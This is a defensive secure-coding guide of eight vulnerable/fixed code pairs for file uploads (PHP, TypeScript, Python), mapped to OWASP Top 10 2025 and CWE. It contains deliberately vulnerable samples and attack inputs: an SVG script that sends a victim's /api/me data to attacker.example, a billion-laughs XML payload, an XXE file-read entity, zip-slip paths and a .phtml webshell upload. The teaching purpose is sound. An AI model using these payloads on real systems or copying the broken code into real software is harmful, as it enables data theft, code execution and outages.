# File Upload Examples

Eight vulnerable/fixed pairs. Each names the Top 10 2025 category, the CWE, the ASVS chapter,
and why the fix closes the hole rather than only looking safer.

Every block marked `Vulnerable:` is deliberately broken. Do not copy one into a project.

## Contents

- [Declared type trusted, stored in the web root](#declared-type-trusted-stored-in-the-web-root) - A08, A02, CWE-434
- [SVG rendered inline becomes stored XSS](#svg-rendered-inline-becomes-stored-xss) - A05, CWE-79
- [Pixel flood in a thumbnail worker](#pixel-flood-in-a-thumbnail-worker) - A10, CWE-409
- [Zip slip in an archive importer](#zip-slip-in-an-archive-importer) - A01, CWE-22
- [Presigned URL with no constraints](#presigned-url-with-no-constraints) - A01, A06, CWE-434
- [Path traversal in a download endpoint](#path-traversal-in-a-download-endpoint) - A01, CWE-22
- [Entity expansion while parsing an uploaded document](#entity-expansion-while-parsing-an-uploaded-document) - A08, CWE-611
- [EXIF GPS served to every viewer](#exif-gps-served-to-every-viewer) - A01, CWE-359

---

## Declared type trusted, stored in the web root

`A08:2025` · `A02:2025` · `CWE-434` · ASVS V5

```php
// Vulnerable: both checks are client-supplied claims, destination is served by PHP
$name = $_FILES['doc']['name'];
$ext  = strtolower(pathinfo($name, PATHINFO_EXTENSION));

if ($_FILES['doc']['type'] === 'image/png' && $ext !== 'php') {
    move_uploaded_file($_FILES['doc']['tmp_name'], __DIR__ . "/uploads/$name");
    echo "saved to /uploads/$name";
}
```

The multipart `type` header is whatever the client wrote. The extension denylist misses
`.phtml`, `.phar`, `.pht`, `.php5`, and `.PHP`. Upload `shell.phtml`, request
`/uploads/shell.phtml`, and PHP-FPM executes it. That is remote code execution from an
ordinary user account.

```php
// Fixed: bytes decide the type, server decides the name, storage is not served
$tmp   = $_FILES['doc']['tmp_name'];
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mime  = $finfo->file($tmp);

$allowed = ['image/png' => 'png', 'image/jpeg' => 'jpg', 'image/webp' => 'webp'];
if (!isset($allowed[$mime])) {
    throw new InvalidArgumentException('unsupported_type');
}
if (filesize($tmp) > 10 * 1024 * 1024) {
    throw new InvalidArgumentException('file_too_large');
}

$stored = bin2hex(random_bytes(16)) . '.' . $allowed[$mime];
move_uploaded_file($tmp, "/srv/app-data/uploads/$stored");

$stmt = $pdo->prepare(
    'INSERT INTO files (owner_id, stored_name, safe_type, display_name) VALUES (?,?,?,?)'
);
$stmt->execute([$actorId, $stored, $mime, $name]);   // display name stored, never used as a path
```

Why this works: the storage directory is not inside any document root, so no handler can be
mapped to it and nothing there is reachable as a URL. The stored name contains no attacker
bytes, so extension tricks and traversal sequences have nowhere to land. The type comes from
the file's own bytes.

The tempting wrong fix is a bigger extension denylist. Denylists enumerate what you thought
of, and the executable-suffix list differs per deployment. Allowlist the type from the bytes
and generate the name.

Belt and braces at the edge, for a legacy deployment you cannot immediately move:

```nginx
location ^~ /uploads/ {
    location ~ \.(php|phtml|phar|pht|php\d*|jsp|jspx|cgi|pl|py|sh)$ { return 404; }
    autoindex off;
    default_type application/octet-stream;
    add_header X-Content-Type-Options "nosniff" always;
    add_header Content-Disposition "attachment" always;
}
```

This is defense in depth, not the fix. Move the files out of the web root.

---

## SVG rendered inline becomes stored XSS

`A05:2025` · `CWE-79` · ASVS V1, V3, V5

An SVG is an XML document that carries script, event handlers, `<foreignObject>` with HTML,
and external references. Magic-number detection passes it happily - an SVG genuinely is an
SVG.

```typescript
// Vulnerable: type came from bytes, and the bytes are a script-bearing document
app.get("/logo/:id", async (req, res) => {
  const row = await db.file.findUnique({ where: { id: req.params.id } });
  res.setHeader("Content-Type", row.detectedType);   // image/svg+xml
  res.send(row.bytes);
});
```

Upload:

```xml
<svg xmlns="http://www.w3.org/2000/svg"><script>
  fetch("/api/me").then(r => r.json()).then(d => fetch("https://attacker.example/?" + btoa(JSON.stringify(d))));
</script></svg>
```

Navigating to `/logo/abc` on the application origin executes that script with the victim's
session cookies. An `<img src>` reference does not run the script, but a direct link, a new
tab, or an inline `<svg>` include does - and you do not control which one a future template
author reaches for.

```typescript
// Fixed: rasterise on upload; the stored artefact is not a document any more
import sharp from "sharp";

const png = await sharp(uploadedBytes, { limitInputPixels: 25_000_000 })
  .resize({ width: 512, height: 512, fit: "inside", withoutEnlargement: true })
  .png()
  .toBuffer();
await store.put(key, png, { contentType: "image/png" });
```

Why this works: the SVG never reaches a browser. Rasterising discards script, event handlers,
and external references because none of them survive as pixels.

When vector output is a product requirement, ranked by residual risk:

1. Rasterise. No residual script risk. Costs scalability and file size.
2. Serve from a separate origin with `Content-Disposition: attachment`,
   `X-Content-Type-Options: nosniff`, and `Content-Security-Policy: default-src 'none';
   sandbox`. Script may still run, but on an origin with no session and no same-origin
   access to your API.
3. Sanitise with DOMPurify in SVG mode, or another maintained SVG sanitiser, and re-serialise.
   Weakest option: sanitiser bypasses are found regularly, and you are betting on the parser
   agreeing with the browser's parser.

Do not do 3 alone on your primary origin. Renaming the file to `.png` is not an option
either - the bytes are still XML, and a browser asked to render them as SVG will.

---

## Pixel flood in a thumbnail worker

`A10:2025` · `CWE-409` · ASVS V2, V5

```python
# Vulnerable: 40 KB on the wire, tens of gigabytes decoded
from PIL import Image

def make_thumbnail(path, out):
    with Image.open(path) as im:
        im.thumbnail((256, 256))
        im.save(out, "JPEG")
```

A 64000x64000 PNG of one flat colour compresses to a few tens of kilobytes. Decoded at 4
bytes per pixel that is roughly 16 GB of RSS. The worker is OOM-killed; concurrent requests
take the host with it. The file size limit passed, because the file is small.

```python
# Fixed: read the header, check pixels before decoding, cap bytes and set an explicit limit
from io import BytesIO
from pathlib import Path
from PIL import Image, ImageOps

MAX_BYTES = 10 * 1024 * 1024
MAX_PIXELS = 25_000_000          # ~5000x5000, below Pillow's own default
Image.MAX_IMAGE_PIXELS = MAX_PIXELS

def make_thumbnail(raw: bytes, out: Path) -> None:
    if len(raw) > MAX_BYTES:
        raise ValueError("file_too_large")

    with Image.open(BytesIO(raw)) as probe:
        width, height = probe.size          # header only, no pixel data decoded yet
        if width * height > MAX_PIXELS:
            raise ValueError("too_many_pixels")

    with Image.open(BytesIO(raw)) as im:
        im = ImageOps.exif_transpose(im).convert("RGB")
        im.thumbnail((256, 256))
        buf = BytesIO()
        im.save(buf, "JPEG", quality=85)
    out.write_bytes(buf.getvalue())
```

Why this works: `Image.open` is lazy - it parses the header and gives you `size` without
allocating the pixel buffer. Rejecting on dimensions happens before any large allocation.
`convert()` and `thumbnail()` are the first calls that actually decode.

Relying on Pillow's default is the tempting shortcut. Two problems: the default
`MAX_IMAGE_PIXELS` is 89,478,485, which is around 350 MB of RGBA and already enough to hurt
a small container; and Pillow only raises `DecompressionBombError` above twice that value -
between 1x and 2x the limit it emits a `DecompressionBombWarning` and carries on. Set an
application limit and check it yourself.

Verified against Pillow 12.1.0: `Image.MAX_IMAGE_PIXELS == 89478485`, and
`_decompression_bomb_check` raises only when `pixels > 2 * MAX_IMAGE_PIXELS`.

Remaining gap: this bounds one image, not the fleet. Also cap worker concurrency and set an
OS memory limit on the process, or many just-under-the-limit images do the same job.

---

## Zip slip in an archive importer

`A01:2025` · `CWE-22` · ASVS V5

```typescript
// Vulnerable: the archive chooses where its contents land
import unzipper from "unzipper";
import { createWriteStream } from "node:fs";
import path from "node:path";

for await (const entry of stream.pipe(unzipper.Parse({ forceStream: true }))) {
  const dest = path.join(WORK_DIR, entry.path);
  entry.pipe(createWriteStream(dest));
}
```

An entry named `../../../../home/app/.ssh/authorized_keys` resolves outside `WORK_DIR`, and
`path.join` follows it there. On Windows, `..\\` and a drive-letter prefix do the same.
Entry names are archive metadata, which means they are attacker input.

```typescript
// Fixed: resolve each entry, require containment, bound count and expanded size
import unzipper from "unzipper";
import { createWriteStream } from "node:fs";
import { mkdir } from "node:fs/promises";
import path from "node:path";
import crypto from "node:crypto";

const MAX_ENTRIES = 1_000;
const MAX_TOTAL_BYTES = 100 * 1024 * 1024;

export async function importArchive(stream: NodeJS.ReadableStream) {
  const root = path.resolve(WORK_ROOT, crypto.randomUUID());   // fresh, empty directory
  await mkdir(root, { recursive: true });

  let entries = 0;
  let written = 0;

  for await (const entry of stream.pipe(unzipper.Parse({ forceStream: true }))) {
    if (++entries > MAX_ENTRIES) throw new Error("archive_too_many_entries");

    const dest = path.resolve(root, entry.path);
    const rel = path.relative(root, dest);
    if (rel === "" || rel.startsWith("..") || path.isAbsolute(rel)) {
      entry.autodrain();
      throw new Error("archive_path_traversal");
    }
    if (entry.type === "Directory") {
      await mkdir(dest, { recursive: true });
      entry.autodrain();
      continue;
    }

    await mkdir(path.dirname(dest), { recursive: true });
    const out = createWriteStream(dest, { flags: "wx" });      // never overwrite
    for await (const chunk of entry) {
      written += chunk.length;
      if (written > MAX_TOTAL_BYTES) {
        out.destroy();
        throw new Error("archive_expands_too_far");
      }
      out.write(chunk);
    }
    out.end();
  }
  return root;
}
```

Why this works: containment is tested on the resolved absolute path, so `..` segments and
absolute prefixes are already collapsed when the check runs. `path.relative` starting with
`..` is the definitive answer to "did this escape", and it does not depend on string
matching. `wx` means a later entry cannot overwrite an earlier one - the trick that turns
duplicate entry names into a swap of an already-validated file.

The tempting wrong fixes, and why they fail:

- `if (entry.path.includes(".."))` - misses encoded and mixed separators, and rejects the
  legitimate file `notes..txt`.
- `path.basename(entry.path)` - safe, but flattens the tree, so it is only correct if you did
  not want directories.
- Checking `path.join` output against a prefix string - `/srv/work-evil` passes a
  `startsWith("/srv/work")` test.

For tar, entry names are only half of it: tar carries symlinks, hard links, device nodes, and
setuid bits. A symlink entry `data -> /etc` followed by an entry writing `data/passwd` escapes
without any `..` in a path. In Python use `tarfile.extractall(filter="data")`, which refuses
absolute and escaping paths, refuses links pointing outside the destination, refuses device
files, and clears setuid/setgid/sticky bits. It became the default in Python 3.14; on 3.12 and
3.13 pass it explicitly. In Node, no core tar exists - with the `tar` package set
`preservePaths: false` (the default) and filter entry types yourself. The Python docs are
explicit that no filter blocks every dangerous archive feature: `data` does not stop
zip-bomb-style resource exhaustion or repeated members, so keep the count and byte limits.

---

## Presigned URL with no constraints

`A01:2025` · `A06:2025` · `CWE-434` · ASVS V4, V5

```typescript
// Vulnerable: client picks the key, no size cap, no type cap, no post-upload check
app.post("/api/uploads/sign", requireAuth, async (req, res) => {
  const url = await getSignedUrl(
    s3,
    new PutObjectCommand({ Bucket: BUCKET, Key: req.body.key }),
    { expiresIn: 3600 },
  );
  res.json({ url });
});

app.post("/api/uploads/done", requireAuth, async (req, res) => {
  await db.file.create({ data: { ownerId: req.user.id, key: req.body.key, status: "ready" } });
  res.json({ ok: true });
});
```

Four separate holes. The client names the key, so `Key: "config/app-settings.json"` or
another tenant's prefix is writable. There is no size limit, so a 500 GB upload is a storage
bill. There is no content constraint, so the object can be HTML that later gets served from
the bucket's origin. And `/done` marks the record ready without anyone reading the bytes -
the validation you wrote for the direct-upload path simply does not run.

```typescript
// Fixed: server-chosen key, policy constraints, quarantine state, async validation
import { createPresignedPost } from "@aws-sdk/s3-presigned-post";
import crypto from "node:crypto";

const MAX_BYTES = 10 * 1024 * 1024;
const ALLOWED = new Set(["image/png", "image/jpeg", "image/webp"]);

app.post("/api/uploads/sign", requireAuth, async (req, res) => {
  const contentType = String(req.body.contentType ?? "");
  if (!ALLOWED.has(contentType)) return res.status(400).json({ error: "unsupported_type" });

  const id = crypto.randomUUID();
  const key = `quarantine/${req.user.id}/${id}`;

  const post = await createPresignedPost(s3, {
    Bucket: BUCKET,
    Key: key,
    Expires: 300,
    Conditions: [
      ["content-length-range", 1, MAX_BYTES],
      ["eq", "$key", key],
      ["eq", "$Content-Type", contentType],
    ],
    Fields: { key, "Content-Type": contentType },
  });

  await db.file.create({
    data: { id, ownerId: req.user.id, key, status: "quarantine", declaredType: contentType },
  });
  res.json({ id, url: post.url, fields: post.fields });
});
```

Then validate the bytes before anything can read them. Drive it from a storage event, not
from a client callback:

```typescript
// s3:ObjectCreated:* on the quarantine/ prefix
export async function onQuarantineObject(key: string) {
  const record = await db.file.findFirst({ where: { key, status: "quarantine" } });
  if (!record) return;                                  // no matching intent: nothing to publish

  const raw = await readObject(BUCKET, key, MAX_BYTES);
  const detected = await detectFromBytes(raw);          // magic-number detection
  if (!ALLOWED.has(detected)) return quarantineFail(record, "type_mismatch");

  const clean = await reencodeImage(raw);               // strips EXIF and non-pixel payloads
  if (await scan(clean) !== "clean") return quarantineFail(record, "scanner_flagged");

  const finalKey = `files/${record.ownerId}/${record.id}`;
  await putObject(BUCKET, finalKey, clean, { contentType: "image/webp" });
  await deleteObject(BUCKET, key);
  await db.file.update({
    where: { id: record.id },
    data: { key: finalKey, safeType: "image/webp", status: "available" },
  });
}
```

Why this works: `content-length-range` and the `eq` conditions are signed into the policy, so
S3 rejects a request that breaks them - the constraint is enforced by the storage service, not
by the browser you asked nicely. The key is server-generated and prefixed with the owner, so
one user cannot write into another's space or over application data. And the object is
unreadable by the app until a worker has read the actual bytes, so a lying `Content-Type`
changes nothing.

Two things the policy cannot do, worth stating plainly. It cannot verify content: `Content-Type:
image/png` in the policy constrains the header the browser sends, not the bytes. And
`content-length-range` is a PresignedPost feature - a presigned PUT has no equivalent, which is
the main reason to prefer POST for browser uploads. If PUT is required, cap size with a bucket
policy or check `ContentLength` in the validation worker and delete oversized objects.

The quarantine prefix needs its own guard: no public read, and no CDN behaviour serving it.
Otherwise an attacker uses the window between upload and validation.

---

## Path traversal in a download endpoint

`A01:2025` · `CWE-22` · ASVS V5

```php
// Vulnerable: the client names the file, and the response type follows the extension
$name = $_GET['file'];
$path = '/srv/app-data/uploads/' . $name;

if (str_contains($name, '..')) {
    http_response_code(400);
    exit;
}
header('Content-Type: ' . mime_content_type($path));
readfile($path);
```

The `..` check is a string test on the raw input, and PHP decodes `%2e%2e%2f` before your code
sees it in some configurations, so the reject fires inconsistently. Worse, the check never
looks at the resolved path: a symlink inside the upload directory pointing at `/etc` needs no
`..` at all. And nothing checks who owns the file, so any authenticated user reads every
upload by name.

```php
// Fixed: opaque ID, owner-scoped lookup, resolve then contain, fixed headers
$root = realpath('/srv/app-data/uploads');

$stmt = $pdo->prepare(
    'SELECT stored_name, safe_type, display_name FROM files WHERE id = ? AND owner_id = ?'
);
$stmt->execute([$_GET['id'], $actorId]);
$row = $stmt->fetch(PDO::FETCH_ASSOC);
if ($row === false) {
    http_response_code(404);                       // same answer for missing and not-yours
    exit;
}

$path = realpath($root . '/' . $row['stored_name']);
if ($path === false || !str_starts_with($path, $root . DIRECTORY_SEPARATOR) || !is_file($path)) {
    http_response_code(404);
    exit;
}

$fallback = preg_replace('/[^A-Za-z0-9._-]/', '_', $row['display_name']);
header('Content-Type: ' . $row['safe_type']);      // validated at upload, not sniffed now
header('Content-Disposition: attachment; filename="' . $fallback . '"');
header('X-Content-Type-Options: nosniff');
readfile($path);
```

Why this works: `realpath` collapses `..`, `.`, and symlinks, so the containment test runs on
the real location. The client supplies a database ID, not a path, so there is no filename to
traverse with. The query is scoped to the owner, so the endpoint is not an enumeration oracle
- and a missing file and someone else's file both return 404.

Note the separator in the prefix test. `str_starts_with($path, $root)` alone would accept
`/srv/app-data/uploads-old/secret`. Appending the separator is what makes the prefix a
directory boundary rather than a string.

The display name is rewritten, not escaped, for the header. A CR or LF in a filename is
header injection; anything outside a conservative character class is replaced. For non-ASCII
names, add `filename*=UTF-8''` with percent-encoding alongside the ASCII fallback.

---

## Entity expansion while parsing an uploaded document

`A08:2025` · `CWE-611` · ASVS V2, V5

SVG, DOCX, XLSX, PPTX, and ODF are XML. An XML parser with entity expansion enabled turns a
few kilobytes into gigabytes of memory, or reads local files.

```python
# Vulnerable: parses attacker XML with a parser that resolves entities
import xml.etree.ElementTree as ET

def read_svg_title(raw: bytes) -> str | None:
    root = ET.fromstring(raw)
    node = root.find("{http://www.w3.org/2000/svg}title")
    return node.text if node is not None else None
```

The classic payload nests entity definitions so that each level multiplies the last:

```xml
<!DOCTYPE bomb [
  <!ENTITY a "aaaaaaaaaaaaaaaaaaaa">
  <!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;&a;&a;">
  <!ENTITY c "&b;&b;&b;&b;&b;&b;&b;&b;&b;&b;">
  <!-- ... -->
]>
<svg xmlns="http://www.w3.org/2000/svg"><title>&c;</title></svg>
```

```python
# Fixed: a parser that refuses DTDs and entities outright
from defusedxml.ElementTree import fromstring
from defusedxml.common import DefusedXmlException

MAX_XML_BYTES = 2 * 1024 * 1024

def read_svg_title(raw: bytes) -> str | None:
    if len(raw) > MAX_XML_BYTES:
        raise ValueError("xml_too_large")
    try:
        root = fromstring(raw, forbid_dtd=True, forbid_entities=True, forbid_external=True)
    except DefusedXmlException:
        raise ValueError("unsafe_xml")
    node = root.find("{http://www.w3.org/2000/svg}title")
    return node.text if node is not None else None
```

Why this works: the bomb depends on the parser expanding entity references. `forbid_dtd`
rejects the document at the `<!DOCTYPE` declaration, before any expansion begins, so the cost
is bounded by the input size. `forbid_external` closes the file-read and SSRF variants
(`<!ENTITY x SYSTEM "file:///etc/passwd">`).

Version detail worth knowing. Python's built-in parsers use libexpat, and the 3.14 docs state
that Expat below 2.7.2 may be vulnerable to billion laughs, quadratic blowup, and large-token
attacks. The old per-module vulnerability table is gone from the docs; the guidance is now to
check `pyexpat.EXPAT_VERSION` at runtime. Do not assume the bundled Expat is current - the
same Python version ships against different Expat builds depending on how it was configured.
`defusedxml` stays worth using as defense in depth precisely because you often cannot
guarantee the Expat build.

The same applies in Node and PHP. In `libxmljs`/`libxml2` bindings, leave `noent` and
`nonet` off. In PHP, do not pass `LIBXML_NOENT` and do not enable
`LIBXML_DTDLOAD`/`LIBXML_DTDVALID` on untrusted input.

Do not forget the container. A DOCX is a ZIP of XML parts, so it is a decompression bomb
target and an entity expansion target at once. Bound both the expanded ZIP size and each
part's XML size.

---

## EXIF GPS served to every viewer

`A01:2025` · `CWE-359` · ASVS V14, V5

```python
# Vulnerable: original bytes served untouched, metadata and all
def save_photo(raw: bytes, dest: Path) -> None:
    dest.write_bytes(raw)
```

A phone photo carries `GPSLatitude`, `GPSLongitude`, and a timestamp. Publish a user's photo
and you publish where they were and when. It also carries the camera serial number, which
links accounts that were meant to be separate. Nobody exploits this loudly, so it survives
review for years.

```python
# Fixed: re-encode from pixel data only, no metadata carried over
from io import BytesIO
from pathlib import Path
from PIL import Image, ImageOps

def save_photo(raw: bytes, dest: Path) -> None:
    with Image.open(BytesIO(raw)) as src:
        image = ImageOps.exif_transpose(src)        # apply orientation before dropping EXIF
        image = image.convert("RGB")
        buf = BytesIO()
        image.save(buf, "JPEG", quality=88, optimize=True)   # no exif= argument: none written
    dest.write_bytes(buf.getvalue())
```

Why this works: the new file is built from the decoded pixel array. EXIF, XMP, IPTC, ICC
comments, and any trailing appended data exist only in the source container and are not
carried into the output. This is the same operation that defeats polyglots - one control,
two benefits.

Two details that bite. Apply `exif_transpose` first: EXIF orientation is the reason
"stripping metadata" often rotates everyone's photos sideways. And be explicit about the ICC
profile - dropping it shifts colours on wide-gamut images, so pass
`icc_profile=src.info.get("icc_profile")` if colour accuracy matters. That is a deliberate
choice to keep one metadata block, not an accident.

What this does not cover: metadata in formats you are not re-encoding. PDFs keep author,
producer, and creation-tool fields; Office documents keep the author and revision history;
video keeps creation location. Each needs its own stripping step, and for PDF that means a
dedicated library rather than a re-encode.

---

## Sources

- OWASP Top 10 2025 - <https://owasp.org/Top10/2025/>
- OWASP ASVS - <https://owasp.org/www-project-application-security-verification-standard/>
- OWASP File Upload Cheat Sheet - <https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html>
- CWE-434, CWE-22, CWE-79, CWE-409, CWE-611, CWE-359 - <https://cwe.mitre.org/>
- Python `tarfile` extraction filters - <https://docs.python.org/3/library/tarfile.html#extraction-filters>
- Python XML security notes - <https://docs.python.org/3/library/xml.html>
